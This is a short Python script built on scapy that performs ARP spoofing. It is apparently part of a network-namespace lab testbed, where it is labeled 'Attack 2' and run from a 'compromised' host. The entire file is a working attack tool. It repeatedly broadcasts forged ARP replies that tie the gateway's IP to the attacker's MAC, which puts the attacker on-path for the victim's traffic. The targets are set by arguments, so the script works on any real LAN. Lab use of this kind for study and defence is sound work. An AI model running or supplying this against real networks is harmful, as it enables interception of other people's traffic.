#!/usr/bin/env python3
"""
arp_spoof.py — Attack 2: ARP spoofing / cache poisoning.

Run from it_srv (the "compromised" IT host) to poison it_pc's ARP cache,
making it_pc believe the attacker's MAC is the gateway (branch_rtr, itlink)
so traffic from it_pc toward the gateway is sent to the attacker instead
(a classic on-path / MITM setup).

Run as:  ip netns exec it_srv python3 attacks/arp_spoof.py \
             --victim 10.10.1.11 --gateway 10.10.1.1 --duration 20
"""
import argparse
import time
from scapy.all import ARP, Ether, sendp, get_if_hwaddr


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--victim", default="10.10.1.11", help="victim IP (it_pc)")
    ap.add_argument("--gateway", default="10.10.1.1", help="real gateway IP")
    ap.add_argument("--iface", default="it0")
    ap.add_argument("--duration", type=int, default=20)
    ap.add_argument("--interval", type=float, default=2.0)
    args = ap.parse_args()

    attacker_mac = get_if_hwaddr(args.iface)
    print(f"[arp_spoof] Attacker MAC: {attacker_mac}")
    print(f"[arp_spoof] Telling {args.victim} that {args.gateway} is at "
          f"{attacker_mac} for {args.duration}s...")

    # Gratuitous/unsolicited ARP "is-at" reply: claims gateway's IP, attacker's MAC
    pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,                      # is-at (reply)
        psrc=args.gateway,         # IP being impersonated
        hwsrc=attacker_mac,        # attacker's real MAC
        pdst=args.victim,
    )

    end = time.time() + args.duration
    sent = 0
    while time.time() < end:
        sendp(pkt, iface=args.iface, verbose=0)
        sent += 1
        time.sleep(args.interval)

    print(f"[arp_spoof] Done. Sent {sent} spoofed ARP replies.")


if __name__ == "__main__":
    main()
